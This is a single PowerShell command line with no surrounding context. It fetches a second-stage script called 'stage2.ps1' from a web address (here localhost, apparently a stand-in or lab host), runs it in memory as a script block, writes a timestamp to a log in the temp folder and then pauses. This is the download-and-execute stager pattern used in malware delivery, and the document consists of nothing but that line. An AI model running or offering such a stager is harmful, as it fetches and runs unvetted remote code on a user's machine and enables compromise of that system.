
$DownloadedScript = (iwr 'http://127.0.0.1/stage2.ps1' -UseBasicParsing).Content; [ScriptBlock]::Create($DownloadedScript).Invoke(); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Start-Sleep -Seconds 28
